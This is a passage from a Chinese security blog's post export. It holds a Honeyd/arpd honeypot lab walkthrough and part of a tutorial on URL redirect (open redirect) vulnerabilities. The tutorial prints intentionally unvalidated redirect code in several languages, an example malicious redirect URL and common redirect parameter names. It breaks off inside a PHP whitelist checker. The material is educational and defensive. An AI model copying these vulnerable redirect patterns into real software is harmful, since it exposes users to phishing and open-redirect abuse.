<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过一次白盒的URL跳转漏洞实践可以更好的掌握其原理，对黑盒测试也有帮助；比如这里的绕过文件判断的限制“/..”，与黑盒中的一些畸形绕过的方式就类似，学海无涯。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></p>
<p><a href="http://www.polaris-lab.com/index.php/tag/web-py/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/web-py/</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
        <tag>python安全</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Honeyd搭建简易蜜罐</title>
    <url>/2018/11/20/%E5%88%A9%E7%94%A8Honeyd%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E8%9C%9C%E7%BD%90/</url>
    <content><![CDATA[<h2 id="一次实验课：利用honeyd搭建蜜罐"><a href="#一次实验课：利用honeyd搭建蜜罐" class="headerlink" title="一次实验课：利用honeyd搭建蜜罐"></a>一次实验课：利用honeyd搭建蜜罐</h2><h3 id="Honeyd相关依赖的安装"><a href="#Honeyd相关依赖的安装" class="headerlink" title="Honeyd相关依赖的安装"></a>Honeyd相关依赖的安装</h3><h4 id="安装g-gcc（对相关的一些依赖进行源码编译安装）"><a href="#安装g-gcc（对相关的一些依赖进行源码编译安装）" class="headerlink" title="安装g++ gcc（对相关的一些依赖进行源码编译安装）"></a>安装g++ gcc（对相关的一些依赖进行源码编译安装）</h4><p><code>sudo apt-get update &amp;&amp; sudo apt-get install g++ gcc</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542713989.95.png" alt></p>
<h4 id="安装Libevent-非同步事件通知的函数库"><a href="#安装Libevent-非同步事件通知的函数库" class="headerlink" title="安装Libevent(非同步事件通知的函数库)"></a>安装Libevent(非同步事件通知的函数库)</h4><p>通过使用libevent，开发人员可以设定某些事件发生时所执行的函数，可以代替以往程序所使用的循环检查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libevent-1.4.14b-stable.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714140.4.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714266.65.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714342.43.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714411.04.png" alt></p>
<h4 id="安装Libdnet-提供跨平台的网络相关的API函数库"><a href="#安装Libdnet-提供跨平台的网络相关的API函数库" class="headerlink" title="安装Libdnet(提供跨平台的网络相关的API函数库)"></a>安装Libdnet(提供跨平台的网络相关的API函数库)</h4><p>包括了ARP缓存，路由表查询，IP包及物理帧的传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libdnet-1.11.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714501.68.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714633.0.png" alt></p>
<h4 id="安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础"><a href="#安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础" class="headerlink" title="安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)"></a>安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libpcap-1.7.3.tar.gz</span><br><span class="line">sudo tar -zxvf libpcap-1.5.3.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">#在Ubuntu下缺少 flex  bison 手动安装</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716679.98.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716838.58.png" alt></p>
<h4 id="安装ARPD（运行在与Honeyd相同的系统上）"><a href="#安装ARPD（运行在与Honeyd相同的系统上）" class="headerlink" title="安装ARPD（运行在与Honeyd相同的系统上）"></a>安装ARPD（运行在与Honeyd相同的系统上）</h4><p>是honeyd众多协作工具中最重要的一个工具。ARPD工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中ARPD会对指定IP地址范围内未使用的IP用honedy的MAC地址做出arp应答。这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机。这样设计可以在内网中最大化的诱导蠕虫病毒，诱导攻击流。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf arpd-0.2.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">#报错：error：expected’)’ before string constant</span><br><span class="line">#解决：在arpd.c文件中添加#define __FUNCTION__</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717043.1.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717136.12.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717261.85.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717343.56.png" alt></p>
<h4 id="安装Honeyd"><a href="#安装Honeyd" class="headerlink" title="安装Honeyd"></a>安装Honeyd</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf honeyd-1.5c.tar.gz</span><br><span class="line">sudo ./configure</span><br><span class="line">#报错：configure: error: Couldn&apos;t figure out how to access libc</span><br><span class="line">#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717614.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717760.42.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717808.49.png" alt></p>
<h4 id="检测arpd和honeyd是否可以运行"><a href="#检测arpd和honeyd是否可以运行" class="headerlink" title="检测arpd和honeyd是否可以运行"></a>检测arpd和honeyd是否可以运行</h4><h5 id="arpd"><a href="#arpd" class="headerlink" title="arpd"></a>arpd</h5><h5 id><a href="#" class="headerlink" title></a><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717918.17.png" alt></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#运行后显示链接不存在</span><br><span class="line">#解决：</span><br><span class="line">whereis  libevent-1.4.so.2</span><br><span class="line">#将libevent-1.4.so.2位置添加到/etc/ld.so.conf</span><br><span class="line">sudo vim /etc/ld.so.conf</span><br><span class="line">#重新加载链接</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718321.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718381.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718352.41.png" alt></p>
<h5 id="honeyd"><a href="#honeyd" class="headerlink" title="honeyd"></a>honeyd</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">honeyd</span><br><span class="line">#报错：无法加载libdnet</span><br><span class="line">#解决：也是无法链接，但是这个缺少链接文件：</span><br><span class="line">whereis libdnet</span><br><span class="line">#生成链接</span><br><span class="line">sudo cp /usr/local/lib/libdnet.1.0.1 /usr/local/lib/libdnet.so.1.0.1</span><br><span class="line">#重新加载</span><br><span class="line">sudo /sbin/ldconfig</span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718573.78.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718977.76.png" alt></p>
<h3 id="简单的调试与测试"><a href="#简单的调试与测试" class="headerlink" title="简单的调试与测试"></a>简单的调试与测试</h3><ul>
<li><p>arpd侦听ens33网卡上的一个空闲的ip:192.168.1.71  </p>
<p><code>sudo arpd -i ens33 192.168.1.71</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719524.81.png" alt></p>
</li>
<li><p>将honeyd下的config.sample改名并配置蜜罐启动的系统及其配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv config.sample ./honeyd.conf</span><br><span class="line">sudo vim honeyd.conf</span><br><span class="line"># Example of a simple host template and its binding</span><br><span class="line">create windows</span><br><span class="line">#创建一个windows xp系统的蜜罐</span><br><span class="line">set windows personality &quot;Microsoft Windows XP Professional SP1&quot;</span><br><span class="line">#设置系统重启时间</span><br><span class="line">set windows uptime 1728650</span><br><span class="line">#设置最大文件描述符</span><br><span class="line">set windows maxfds 35</span><br><span class="line">#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh</span><br><span class="line">add windows tcp port 80 &quot;sh sh //home/toml/Desktop/honeyd/honeyd-1.5c/scripts/web.sh&quot;</span><br><span class="line">#开启22，23端口</span><br><span class="line">add windows tcp port 22 &quot;sh scripts/test.sh $ipsrc $dport&quot;</span><br><span class="line">add windows tcp port 23 proxy $ipsrc:23</span><br><span class="line">#add template udp port 53 proxy 141.211.92.141:53</span><br><span class="line">#关闭默认的tcp,udp连接</span><br><span class="line">set windows default tcp action reset</span><br><span class="line">set windows default udp action reset</span><br><span class="line">#开启135，139端口</span><br><span class="line">add windows tcp port 135 open</span><br><span class="line">add windows tcp port 139 open</span><br><span class="line"></span><br><span class="line">bind 192.168.1.71 windows</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719973.36.png" alt></p>
</li>
<li><p>启动honeyd </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo honeyd -d -f honeyd.conf  -p nmap.prints -x xprobe2.conf -a nmap.assoc -i ens33 192.168.1.71</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720601.46.png" alt></p>
</li>
<li><p>在同网段下ping，访问web服务</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720665.52.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720690.71.png" alt></p>
</li>
<li><p>蜜罐的监听显示如下（分别是本机ping蜜罐机192.168.1.71的ping包和本机访问蜜罐主机的80端口建立连接的过程）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720889.75.png" alt></p>
</li>
<li><p>蜜罐主机应用的web服务显示的脚本内容</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542721041.24.png" alt></p>
</li>
</ul>
<h3 id="实验思考题"><a href="#实验思考题" class="headerlink" title="实验思考题"></a>实验思考题</h3><p>如何利用Honeyd实现跨网段的模拟。</p>
<p>回答：</p>
<ol>
<li>可以利用wmware自带的NAT模式实现路由转发的功能，达到跨网段访问的目的。</li>
<li>可以通过自己手动配置路由表，添加路由规则实现跨网段访问的目的。</li>
</ol>
<h3 id="实验中的问题"><a href="#实验中的问题" class="headerlink" title="实验中的问题"></a>实验中的问题</h3><ol>
<li>对于Libpcap的安装：在Debian下1.7.3版本太高，会出现头文件的报错，使用1.5.3版本，Ubuntu系统无影响；在Ubuntu下缺少 flex  bison ，需要手动安装。</li>
<li>安装完所有的依赖及honeyd后需要配置arpd和honeyd链接的问题，不然无法运行。</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）" target="_blank" rel="noopener">https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）</a></p>
<p><a href="https://blog.csdn.net/accepthjp/article/details/46399715" target="_blank" rel="noopener">https://blog.csdn.net/accepthjp/article/details/46399715</a></p>
<p><a href="https://blog.csdn.net/LFGxiaogang/article/details/73287152" target="_blank" rel="noopener">https://blog.csdn.net/LFGxiaogang/article/details/73287152</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title>URL跳转学习总结</title>
    <url>/2018/11/12/URL%E8%B7%B3%E8%BD%AC%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="URL跳转漏洞学习总结"><a href="#URL跳转漏洞学习总结" class="headerlink" title="URL跳转漏洞学习总结"></a>URL跳转漏洞学习总结</h2><h3 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h3><p>现在web应用越来越多的需要和其他第三方应用交互，以及在自身应用内部根据不同的逻辑引向不同的页面。例如一个典型的场景就是：web站点可以使用第三方账号（如qq,微博等）进行登录，在登录时就会发生跳转，如果在这个过程中没有做好安全策略就会产生安全漏洞。例如可以利用恶意的URL跳转进行钓鱼等。</p>
<h3 id="URL重定向（301-302）"><a href="#URL重定向（301-302）" class="headerlink" title="URL重定向（301/302）"></a>URL重定向（301/302）</h3><ol>
<li>301重定向：当域名或者网址永久弃用后，为了方便可以将此域名或网址重定向到新的域名或URL</li>
<li>302重定向：当域名或网址临时弃用时，为了方便可以将此域名或网址重定向到新的域名或URL</li>
<li>302URL劫持与302任意URL跳转的不同点<ul>
<li>302——URL劫持是由于搜素引擎的算法导致的问题。例如A网站暂时弃用，要302重定向到B网站，但是由于B网站URL太过复杂，而搜索引擎的算法判定A网址更加适合，所以爬取的还是A网址，这个时候访问网站是显示的URL是A网站的，而显示的内容是B网站的，造成了302重定向——URL劫持。</li>
<li>302——任意URL跳转是用户可以直接控制URL跳转的参数或者通过一些绕过方式控制URL跳转的位置造成的问题。</li>
</ul>
</li>
</ol>
<h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>web站点或者第三方的服务端没有对用户输入的参数进行合法性校验，或者校验不严格，在URL跳转时用户可控，导致恶意参数的传入以及执行，将应用程序引导到恶意的第三方区域产生的安全问题（短链接更加难以防范）。</p>
<h4 id="漏洞出现的详细原因"><a href="#漏洞出现的详细原因" class="headerlink" title="漏洞出现的详细原因"></a>漏洞出现的详细原因</h4><ul>
<li>写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞</li>
<li>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过</li>
<li>对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过</li>
<li>原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过</li>
<li>原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过</li>
</ul>
<h3 id="WEB站点中URL跳转漏洞的发生点"><a href="#WEB站点中URL跳转漏洞的发生点" class="headerlink" title="WEB站点中URL跳转漏洞的发生点"></a>WEB站点中URL跳转漏洞的发生点</h3><ul>
<li>用户登录、统一身份认证处、认证以后发生跳转</li>
<li>用户分享、收藏内容后会发生跳转</li>
<li>跨站点认证、在授权后会认证</li>
<li>站内对其他网站的链接，点击后会跳转</li>
</ul>
<h3 id="URL跳转的实现方式"><a href="#URL跳转的实现方式" class="headerlink" title="URL跳转的实现方式"></a>URL跳转的实现方式</h3><ul>
<li><p>通过META标签内跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"url"</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url = $_REQUEST[<span class="string">"url"</span>];</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $url = <span class="string">"url_meta.php"</span>;</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Refresh"</span> <span class="attr">content</span>=<span class="string">"5; url=&lt;?php echo $url?&gt;"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529489.94.png" alt></p>
</li>
</ul>
</li>
<li><p>通过JavaScript跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	echo <span class="string">"&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;"</span>;</span><br><span class="line">	exit;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	echo <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529568.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529591.92.png" alt></p>
</li>
</ul>
</li>
<li><p>通过header头跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	header(<span class="string">"Location: $target"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果jump参数没有任何限制，用户就可以构造恶意链接进行提交造成恶意URL跳转 <code>http://www.lsowl.xyz/aaa.php?url=http://www.eval.com</code> ，通过恶意链接造成不可信的第三方跳转可以进一步钓鱼等(直接跳转)。</p>
</li>
<li><p>同时由于一些网站的安全策略，白名单中有 <code>http://www.lsowl.xyz/aaa.php</code> 而导致一些安全策略被绕过，导致用户最终访问的时恶意链接。（过滤不严格的白名单）</p>
</li>
</ul>
</li>
</ul>
<p>通过GET或POST的方式接收将要跳转的URL，然后通过上面的几种方式中的一种来跳转到目标URL。由于用户的输入会进入META，JavaScript，http头，所以都可能发生相应的上下文漏洞，如XSS等，同时URL跳转功能的特点，会在浏览器将用户从可信的站点跳转到不可信的站点，如果用户的输入带有敏感信息会泄露给不可信的第三方。</p>
<h3 id="常见的发生URL跳转的参数名"><a href="#常见的发生URL跳转的参数名" class="headerlink" title="常见的发生URL跳转的参数名"></a>常见的发生URL跳转的参数名</h3><ul>
<li>redirect</li>
<li>redirect_to</li>
<li>redirect_url</li>
<li>url</li>
<li>jump</li>
<li>jump_to</li>
<li>target</li>
<li>to</li>
<li>link</li>
<li>linkto</li>
<li>domain</li>
</ul>
<h3 id="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"><a href="#几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）" class="headerlink" title="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"></a>几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）</h3><ul>
<li><p>Java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.sendRedirect(request.getParameter(<span class="string">"url"</span>));</span><br></pre></td></tr></table></figure>
</li>
<li><p>PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$redirect_url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: "</span> . $redirect_url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>.NET</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string redirect_url = request.QueryString[&quot;url&quot;];</span><br><span class="line">Response.Redirect(redirect_url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Django</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">redirect_url = request.GET.get("url")</span></span><br><span class="line"><span class="xml">HttpResponseRedirect(redirect_url)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Flask</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_url = request.form[&apos;url&apos;]</span><br><span class="line">redirect(redirect_url)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Rails</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_to params[:url]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="网站后端对白名单限制（以PHP为例）"><a href="#网站后端对白名单限制（以PHP为例）" class="headerlink" title="网站后端对白名单限制（以PHP为例）"></a>网站后端对白名单限制（以PHP为例）</h3><ul>
<li><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// $allowedDomains 表示允许跳转的url白名单</span></span><br><span class="line">$allowedDomains = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"aaaa.com"</span></span><br><span class="line">        <span class="string">"bbbb.com"</span></span><br><span class="line">        .......</span><br><span class="line">    );</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeUrl</span><span class="params">($urlInfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $path = <span class="keyword">isset</span>($urlInfo[<span class="string">'path'</span>]) ? $urlInfo[<span class="string">'path'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($path))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"/"</span>, $path);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $t[$i] = rawurlencode($t[$i]);             </span><br><span class="line">            &#125;</span><br><span class="line">            $path = implode(<span class="string">"/"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        $query = <span class="keyword">isset</span>($urlInfo[<span class="string">'query'</span>]) ? $urlInfo[<span class="string">'query'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($query))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"&amp;"</span>, $query);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $tt = explode(<span class="string">"="</span>, $t[$i]);</span><br><span class="line">                $tt[<span class="number">1</span>] = rawurlencode($tt[<span class="number">1</span>]);</span><br><span class="line">                $t[$i] = implode(<span class="string">"="</span>, $tt);            </span><br><span class="line">            &#125;</span><br><span class="line">            $query = implode(<span class="string">"&amp;"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($urlInfo[<span class="string">'host'</span>]) || <span class="keyword">empty</span>($urlInfo[<span class="string">'host'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> $path. <span class="string">"?"</span>. $query;</span><br><span class="line">        &#125;</span><br><span class="line">        $scheme = <span class="keyword">isset</span>($urlInfo[<span class="string">'scheme'</span>]) ? $urlInfo[<span class="string">'scheme'</span>] : <span class="string">'http'</span>;</span><br><span class="line">        $port = <span class="keyword">isset</span>($urlInfo[<span class="string">'port'</span>]) ? $urlInfo[<span class="string">'port'</span>] : <span class="number">80</span>;</span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">        $request = $scheme . <span class="string">'://'</span>. $urlInfo[<span class="string">'host'</span>];</span><br><span class="line">        $request .= ($port == <span class="number">80</span>) ? <span class="string">''</span> : <span class="string">':'</span>.$port;</span><br><span class="line">        $request .= $path;</span><br><span class="line">        $request .= (<span class="keyword">empty</span>($query)) ? <span class="string">''</span> : <span class="string">'?'</span>.$query;</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUrl</span><span class="params">($url,$domainArr=array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $res = <span class="keyword">array</span>(<span class="string">'isTrustedDomain'</span> =&gt; <span class="keyword">false</span>,<span class="string">'url'</span> =&gt; <span class="string">''</span>,<span class="string">'domain'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url))     <span class="keyword">return</span> $res;</span><br><span class="line">        $domainArr = <span class="keyword">empty</span>($domainArr) || !is_array($domainArr) ? $allowedDomains : $domainArr;</span><br><span class="line">        $url      = filterUrl($url);<span class="comment">//先过滤特殊字符</span></span><br><span class="line">        $p      = parse_url($url);</span><br><span class="line">        $scheme = $p[<span class="string">'scheme'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!in_array(strtolower($scheme),<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        $host   = $p[<span class="string">'host'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!isValidHost($host))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">        $hostLen = strlen($host);</span><br><span class="line">        <span class="keyword">foreach</span>($domainArr <span class="keyword">as</span> $domain)&#123;</span><br><span class="line">            $firstPos = strpos($host, $domain);</span><br><span class="line">            <span class="keyword">if</span>($firstPos !== <span class="keyword">false</span> &amp;&amp; ($firstPos + strlen($domain)) == $hostLen)&#123;</span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span>($firstPos == <span class="number">0</span> || $domain[<span class="number">0</span>] == <span class="string">'.'</span> || $host[$firstPos<span class="number">-1</span>] == <span class="string">'.'</span>)&#123;</span><br><span class="line">                    $res[<span class="string">'isTrustedDomain'</span>] = <span class="keyword">true</span>;</span><br><span class="line">                    $res[<span class="string">'url'</span>]                         = $url;</span><br><span class="line">                    $res[<span class="string">'domain'</span>]              = $domain;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterUrl</span><span class="params">( $url )</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url)) <span class="keyword">return</span> $url;</span><br><span class="line">        <span class="comment">// Strip all of the Javascript in script tags out...</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/&lt;SCRIPT.*?&lt;\/SCRIPT&gt;/ims'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">// Strip all blank character</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/[\s\v\0]+/'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">//Strip special characters(',",&lt;,&gt;,\)</span></span><br><span class="line">        $url = str_replace(<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">"\""</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"\\"</span>),<span class="string">''</span>,$url);</span><br><span class="line">        <span class="keyword">return</span> $url;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidHost</span><span class="params">($host)</span></span></span><br><span 